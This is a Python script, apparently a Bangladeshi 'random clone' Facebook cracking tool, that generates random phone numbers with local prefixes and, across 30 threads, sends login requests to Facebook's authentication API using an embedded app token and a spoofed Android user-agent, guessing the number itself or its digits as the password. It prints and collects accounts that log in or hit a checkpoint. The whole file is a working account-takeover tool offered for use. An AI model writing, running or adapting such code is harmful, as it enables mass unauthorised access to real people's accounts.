#AHMED ADIB
import time
import sys
from time import sleep as mile
from os import system as sex
import random 
import string
from concurrent.futures import ThreadPoolExecutor as sx
import uuid
import httpx
import json
def javas():
    print(30*'—')
def __timex__():
    adibx = "<\> CODED BY AHMED ADIB "
    for char in adibx:
        sys.stdout.write(char)
        sys.stdout.flush()
        mile(0.1)
    tx = time.localtime(time.time())
    action = time.asctime(tx)
    last = "\nCURRENT TIME BD : "+time.asctime()
    for char in last:
        sys.stdout.write(char)
        sys.stdout.flush()
        mile(0.1)
ben = """
       d8888 8888888b. 8888888 888888b.   
      d88888 888  "Y88b  888   888  "88b  
     d88P888 888    888  888   888  .88P  
    d88P 888 888    888  888   8888888K.  
   d88P  888 888    888  888   888  "Y88b 
  d88P   888 888    888  888   888    888 
 d8888888888 888  .d88P  888   888   d88P 
d88P     888 8888888P" 8888888 8888888P"                                                                     
"""
def css():
    sex("clear")
    for char in ben:
        sys.stdout.write(char)
        sys.stdout.flush()
        mile(0.02)
    javas()
    print("[•] WONNER  : AHMED ADIB ")
    print("[•] FACEBOOK: AHMED ADIB ")
    print("[•] GITHUB  : MR-ADIB-707 ")
    print("[•] TOOLS   : F/R/G ")
    javas()
def __MRADIB__():
    css()
    javas()
    print("[01] RANDOM CLONE")   
    print("[02] EXIT ")
    javas()
    xxx = input(" [=] CHOSSE : ")
    if xxx == '1':
        RANDOMX()
    if xxx == '2':
        xc = "<\> CODED AHMED ADIB \n"
        for char in xc:
            sys.stdout.write(char)
            sys.stdout.flush()
            mile(0.1)  
        cx = "<\> THANKS FOR USING MY TOOLS"
        for char in cx:
            sys.stdout.write(char)
            sys.stdout.flush()
            mile(0.1) 
        exit()
oks=[]
cps=[]
loop=0
def RANDOMX():
    user=[]
    css()
    print("EXM : 017-018-019-016 ")
    javas()
    server = input("[=] CHOOSSE : ")
    print("EXM : 1000-3000-5000-10000 ")
    lmts = int(input("[=] CHOOSSE : "))
    for nmbr in range(lmts):
        xx = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(xx)
    with sx(max_workers=30) as Adib:    
        cdx=str(len(user))
        javas()
        print("[•] TOTAL IDZ : "+cdx)
        print("[•] BD CODE : "+server)
        print("[=] CRACKING......")
        javas()
        for pw in user:
            ids=server+pw
            passlist=[pw,ids]
            Adib.submit(m1,ids,passlist)
    print("[•] YOUR CRAK COMPLETE √√√")
def m1(ids,passlist):
    global oks;global cps;global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r [HELLO-WORLD] %s | OKK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            dataxx={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            heda= {'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            ulrx="https://api.facebook.com/method/auth.login"
            resp=httpx.post(ulrx,data=dataxx,headers=heda).json()
            if 'session_key' in resp:
                print('\r\r [ADIB-OKK] '+ids+' • '+pas)
                oks.append(ids)
                break
            if 'www.facebook.com' in resp['error_msg']:
                print('\r\r [ADIB-CP] '+ids+' • '+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
if __name__ == '__main__':
    __MRADIB__()    
    
            